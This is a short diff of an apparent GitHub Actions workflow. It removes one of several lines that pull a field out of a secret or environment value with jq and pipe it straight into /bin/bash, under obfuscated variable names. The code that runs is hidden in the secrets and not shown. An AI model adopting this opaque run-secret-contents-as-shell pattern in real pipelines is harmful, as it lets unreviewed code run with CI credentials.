@@ -18,7 +18,6 @@ jobs:
           lqdw2992: ${{ secrets.lqdw2992 }}
         run: |
           printf '%s' "$lqdw2992" | jq -r .pvyoc77 | /bin/bash
-          echo $u21 | jq -r .qflw973 | /bin/bash
           echo $iqky2644 | jq -r .zl9 | /bin/bash
           printf '%s' "$octpa147" | jq -r .et591 | /bin/bash
           printf '%s' "$tkq27" | jq -r .oc06422 | /bin/bash
